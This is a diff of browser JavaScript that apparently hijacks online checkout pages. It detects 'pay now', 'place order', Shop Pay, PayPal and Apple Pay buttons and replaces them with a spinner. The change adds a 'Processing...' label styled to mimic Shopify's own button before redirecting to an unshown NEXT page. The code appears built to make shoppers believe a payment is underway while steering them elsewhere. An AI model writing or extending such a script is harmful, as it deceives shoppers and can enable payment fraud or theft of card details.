@@ -67,7 +67,7 @@
     var logo = btn.querySelector("svg[aria-label], img[alt]");
     var text = ((btn.innerText || "") + " " + (btn.getAttribute("aria-label") || "") + " " +
       (logo ? logo.getAttribute("aria-label") || logo.getAttribute("alt") || "" : "")).replace(/\s+/g, " ").trim();
-    if (/^(pay now|complete order|place order|pay\b)/i.test(text)) return btn;
+    if (/^(pay now|complete order|place order|review order|pay\b)/i.test(text)) return btn;
     if (/shop ?pay|^shop$|paypal|google ?pay|apple ?pay/i.test(text) && btn.closest("[class*=xpress i], [aria-label*=xpress i], section, div")) {
       // express wallets drawn by the page itself (Shop Pay usually is)
       var r = btn.getBoundingClientRect();
@@ -85,8 +85,14 @@
     btn.style.height = r.height + "px";
     btn.classList.add("cp-busy");
     btn.innerHTML = "<span class='cp-spin'></span>";
-    // the wallet / card "confirms" for a beat, then the processing screen takes over
-    window.setTimeout(function () { location.href = NEXT; }, btn.hasAttribute("data-cp-pay") ? 1400 : 1000);
+    var wallet = btn.hasAttribute("data-cp-pay");
+    // as Shopify's own button: a spinner, then "Processing..." beside it
+    if (!wallet) {
+      window.setTimeout(function () {
+        btn.innerHTML = "<span style='display:inline-flex;align-items:center;gap:8px'><span class='cp-spin'></span>Processing...</span>";
+      }, 700);
+    }
+    window.setTimeout(function () { location.href = NEXT; }, wallet ? 1400 : 2000);
   }
 
   document.addEventListener("click", function (e) {
